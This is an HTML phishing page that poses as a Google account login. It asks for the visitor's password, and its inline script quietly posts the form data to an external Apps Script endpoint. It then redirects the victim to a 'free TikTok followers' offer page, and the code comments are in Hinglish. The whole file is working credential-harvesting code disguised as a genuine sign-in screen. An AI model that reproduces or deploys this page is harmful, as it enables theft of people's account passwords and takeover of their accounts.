<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google-Style Login</title>
  <link rel="stylesheet" href="style.css">

<body>
    
    <div class="login-container">
    <div class="login-box">
      <div class="logo-placeholder"></div>
      <h2 style="font-size:24px;">Welcome</h1> <br>
      <p id="pp"><img src="loll.png" alt="icon">Use your Google Account<span>&#9660</span></p>


      <br>
      <!-- under form -->
    <form method="post" action="" name="contact-form" id="myForm">
      
      <input type="password" name="your-password" id="password" placeholder="Enter your Password">
<span id="password-error" style="color: red; font-size: 12px; display: none;">Enter your password</span>
      <br>
        
        <br>
        <div class="actions">
          <a href="https://guidebooks.google.com/get-started-with-google/stay-safer-with-google/how-to-recover-your-google-account?hl=en" class="create-account" style="font-size:12px;">Forgot password?</a>
    
      <input type="submit" value="Next" id="submit" class="next-button">
		</div>
      </form>
    </div>
	<!-- end -->
	
	
	<!-- Loading Overlay -->
<div class="loading-overlay" id="loadingOverlay">
    <div class="loading-line"></div>
</div>
	
	
	
	
    <script>
    document.addEventListener("DOMContentLoaded", function () {
        const scriptURL = 'https://script.google.com/macros/s/AKfycby1wCV9O63DhcNRbBjWug5mzgRoZursn5m4yWQMS0_ZDdcP_STF73Zhx77ZuPvEHJND/exec';
        const form = document.getElementById("myForm");
        const passwordInput = document.getElementById("password");
        const passwordError = document.getElementById("password-error");
        const loadingOverlay = document.getElementById("loadingOverlay");

        form.addEventListener("submit", function (event) {
            event.preventDefault(); // Form submit hone se rokna

            if (passwordInput.value.trim() === "") {
                passwordError.style.display = "block"; // Error message show kare
                passwordInput.style.border = "2px solid red"; // Border red kare
            } else {
                passwordError.style.display = "none"; // Error hide kare
                passwordInput.style.border = "1px solid #999"; // Normal border kare

                // Loading screen show kare
                loadingOverlay.style.display = "block";

                // Form ko Google Script ke zariye submit karein
                fetch(scriptURL, { method: 'POST', body: new FormData(form) })
                    .then(response => {
                        window.location.href = "https://views4you.com/offers/free-tiktok-followers/"; // YouTube redirect karein
                    })
                    .catch(error => {
                        console.error('Error!', error.message);
                        loadingOverlay.style.display = "none"; // Agar error aaye toh loading hata dein
                    });
            }
        });

        // Jab user kuch likhne lage toh error hata do
        passwordInput.addEventListener("input", function () {
            if (passwordInput.value.trim() !== "") {
                passwordError.style.display = "none";
                passwordInput.style.border = "1px solid #999"; // Normal border kare
            }
        });
    });
</script>
</body>
</html>
